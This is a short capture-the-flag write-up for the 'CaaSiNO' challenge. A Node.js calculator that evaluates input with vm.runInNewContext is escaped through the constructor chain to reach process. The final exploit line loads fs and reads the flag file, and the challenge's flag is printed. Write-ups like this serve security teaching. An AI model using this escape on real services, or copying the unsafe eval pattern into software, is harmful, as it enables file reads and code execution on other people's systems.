# CaaSiNO

Source: [calculator.js](./calculator.js)

```js
rl.prompt();
rl.addListener("line", (input) => {
	if (input === "q") {
		process.exit(0);
	} else {
		try {
			const result = vm.runInNewContext(input);
			process.stdout.write(result + "\n");
		} catch {
			process.stdout.write("An error occurred.\n");
		}
		rl.prompt();
	}
});
```

Looking at the source, it appears to take your input and run it using `vm.runInNewContext`. Googling for `nodejs vm escape`, we find [this site](https://pwnisher.gitlab.io/nodejs/sandbox/2019/02/21/sandboxing-nodejs-is-hard.html).

We can access the process object via `this.constructor.constructor('return this.process')()`. Based on this, reading the flag is easily accomplished through the `fs` module.

Final Exploit:

```js
this.constructor.constructor("return this.process")().mainModule.require("fs").readFileSync("/ctf/flag.txt").toString();
```

Flag: `flag{vm_1snt_s4f3_4ft3r_41l_29ka5sqD}`
